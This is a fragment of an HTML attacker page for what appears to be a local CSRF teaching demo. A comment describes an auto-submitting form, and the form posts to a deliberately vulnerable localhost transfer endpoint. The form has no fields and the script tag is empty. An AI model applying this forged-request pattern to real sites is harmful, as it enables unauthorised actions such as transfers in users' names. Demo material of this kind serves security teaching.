		<!--
    This form auto-submits to the vulnerable CSRF demo endpoint.

    will go through without their knowledge or consent.

    Open this file directly in the browser, or serve it separately
    from the demo app at http://127.0.0.1:8000/attacker.html
  -->

		<form id="csrf-form" action="http://127.0.0.1:5000/transfer/vulnerable" method="POST">

  </form>

		<script>
